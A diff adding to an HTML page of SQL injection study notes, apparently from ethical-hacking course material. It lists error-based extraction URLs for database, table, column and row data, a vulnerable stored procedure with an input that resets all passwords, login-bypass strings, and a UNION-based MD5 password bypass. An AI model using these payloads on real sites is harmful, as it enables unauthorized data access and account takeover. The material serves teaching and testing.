@@ -29,4 +29,54 @@ back with a MySQL error, the site is most likely vulnerable to <b>UNION SQL inje
 <h2>Extract Database Name</h2>
 <p><i>http://www.certifiedhacker.com/page.aspx?id=1 OR 1=convert(int,(DB_NAME))--</i> -> Syntax error converting the nvarchar value DB_NAME into a column of data type int</p>
 <h2>Extract 1st Database Table</h2>
-<p><i>http://www.certifiedhacker.com/page.aspx?id=1 OR 1=convert</i></p>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1 OR 1=convert(int,(select top 1 name from sysobjects where xtype=char(85)))--</i> -> Syntax error converting the nvarchar value [TABLE NAME 1] into a column of data 
+type int</p>
+<h2>Extract 1st Table Column Name</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int, (select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'))--</i> -> 
+Syntax error converting the nvarchar value [COLUMN NAME 1] into a column of data type int</p>
+<h2>Extract 1st Field of 1st Row (Data)</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int, (select top 1 COLUMN-NAME-1 from TABLE-NAME-1)) --</i> -> Syntax error converting the nvarchar value [FIELD 1 VALUE] into a column of data type int</p>
+
+<h2>Stored Procedure</h2>
+<p>A stored procedure is a prepared SQL code that you can save, so the code can be reused over and over again. So, if you have an SQL query that  you write over and over again, save it as a stored procedure and call it to 
+execute it. You can also pass parameters to a stored procedure, so that the stored procedure can act based on the parameter value(s) that is passed. A stored procedure in SQL is a group of SQL queries that can be saved and 
+reused multiple times. It is very useful as it reduces the need for rewriting SQL queries. It enhances efficiency, reusability and security in database management. Users can also pass parameters to stored procedures so that 
+the stored procedure can act on the passed parameter values.</p>
+
+<h2>Perform Error Based SQL injection using Stored Procedure Injection</h2>
+<p>Some developers use stored procedures, which are designed to perform a specific task. Developers may write static and dynamic SQL statements inside the stored procedures to support the application's functionality. 
+If the developers use dynamic SQL statements in the stored procedure, and if application users input to this dynamic SQL, then the application may be vulnerable to SQL injection attacks. Stored procedure injection 
+attacks are possible if the application does not properly sanitize its input before processing that input in the stored procedure. An attacker can take advantage of improper input validation to launch a stored 
+procedure injection attack on the application.</p>
+<h2>Example stored procedure</h2>
+<p><i>create procedure user_login @username varchar(20), @passwd varchar(2) As<br/>
+Declare @sqlstring varchar(250)<br/>
+Set @sqlstring = '<br/>
+Select 1 from users Where username = ' + @username + ' and passwd = ' + @passwd<br/>
+exec(@sqlstring)</i></p>
+<p>Consider the SQL server stored procedure above, user input: <i>anyusername or 1=1' anypassword</i></p>
+<p>The procedure does not sanitize the input, allowing the return value to display an existing record with these parameters.</p>
+<p>Consider the following SQL server stored procedure:</p>
+<p><i>Create procedure get_report @columnamelist varchar(7900) As Declare @sqlstring varchar(8000) Set @sqlstring = ' Select ' + @columnamelist + ' from ReportTable' exec(@sqlstring) Go</i></p>
+<p>User input: <i>1 from users; update users set password = 'password'; select * </i> -> this results in the report running and all users' passwords being updated</p>
+
+<h1>Bypass Website Logins using SQL Injection</h1>
+<p>Bypassing website logins is a fundamental and common malicious activity that an attacker can perform using SQL injection. This is the easiest way to exploit any SQL injection vulnerability of the 
+application. Attackers chain SQL commands and user-provided parameters together.</p>
+<p><ol>
+    <ul>admin' --</ul>
+    <ul>admin' #</ul>
+    <ul>admin' /*</ul>
+    <ul>' or 1=1--</ul>
+    <ul>' or 1-1#</ul>
+    <ul>' or 1-1/*</ul>
+    <ul>') or '1'='1--</ul>
+    <ul>') or ('1'='1--</ul>
+</ol></p>
+<p>Login as a different user:<br/><i>' UNION SELECT 1,'anotheruser','doesnt matter',1--</i></p>
+<p>You can 'union' the results with a known password and the MD5 hash of a supplied password. The web application will compare your password and the supplied MD5 hash instead of the MD5 from the database.</p>
+<p><ol>
+    <ul>Username: admin</ul>
+    <ul>Password: 1234 ' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055</ul>
+    <ul>81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)</ul>
+</ol></p>
